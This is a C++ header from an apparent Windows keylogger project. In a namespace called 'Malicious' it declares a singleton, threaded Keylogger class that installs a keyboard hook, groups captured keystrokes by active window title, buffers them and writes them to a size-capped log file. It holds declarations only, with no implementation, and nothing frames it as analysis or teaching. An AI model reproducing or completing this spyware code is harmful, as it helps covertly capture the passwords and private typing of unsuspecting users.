#pragma once

#include <map>
#include <string>
#include <fstream>
#include <windows.h>
#include <common/Singleton.hpp>
#include <system/Thread.hpp>

namespace Malicious
{
    typedef __declspec(dllexport) LRESULT (CALLBACK *HookProc) ( int nCode,  WPARAM wParam,  LPARAM lParam);

    // Intercepteur de touches
	class Keylogger : public Common::Singleton<Keylogger>, public System::Thread
    {
        friend class Common::Singleton<Keylogger>;

        protected:
            // l'intercepteur doit connaitre le gestionnaire
            // qui va enregistrer les touches
            Keylogger();
            ~Keylogger();

        public:

            const std::string& getKeylogPath();
            void setKeylog(const std::string& file);
            void flush();
            
			virtual void start();
            virtual void stop();

            void clearKeylog();
            
            void addKey(const char key);
            HHOOK getHook();

			// limite de la taille du fichier log a 5 Mo
			enum {MAX_BUFFERED = 2048, LOGFILE_MAX_SIZE = 5000000};
			
        private:

            HHOOK hook;
            std::string log_file;
            std::fstream log;
            bool isActivated;
            unsigned int buffered_char;
			std::string window;
            std::map<std::string, std::string> log_buffer;

            void updateWindowTitle();
            static DWORD WINAPI MsgLoop(LPVOID lpParameter);
    };

} // Malicious
